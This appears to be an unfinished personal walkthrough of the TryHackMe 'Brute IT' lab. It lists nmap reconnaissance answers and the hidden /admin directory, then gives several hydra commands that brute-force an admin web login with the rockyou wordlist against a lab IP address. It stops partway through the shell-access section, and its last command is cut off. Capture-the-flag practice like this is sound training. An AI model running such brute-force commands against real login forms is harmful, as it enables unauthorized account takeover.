### Brute IT

export IP=10.10.166.204

In this box you will learn about:

- Brute-force

- Hash cracking

- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.

####  Reconnaissance

Before attacking, let's get information about the target

Search for open ports using nmap.
How many ports are open?
- 2

What version of SSH is running?
- OpenSSH 7.6p1

What version of Apache is running?
- 2.4.29

Which Linux distribution is running?
- Ubuntu

![](../../img/Pasted%20image%2020220828045234.png)



Search for hidden directories on web server.
What is the hidden directory?
- /admin

![](../../img/Pasted%20image%2020220828045211.png)


#### Getting a shell

Find a form to get a shell on SSH.


What is the user:password of the admin panel?


As we checked here, the login form needs to provide a username and password. We can check for the username in the comment made in page inspect:

![](../../img/Pasted%20image%2020220828054903.png)

Now that we have a username, we can brute force the password by using hydra:

Here, i got stuck for a while since I cannot get the syntax right:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid" -V


![](../../img/Pasted%20image%2020220828055013.png)

Once we have the password, we can now login to the admin panel:

![](../../img/Pasted%20image%2020220828055116.png)


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=incorrect" -V         

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form “/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid” -V

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form "admin/index.php:user=^USER^&pass=^PASS^:invalid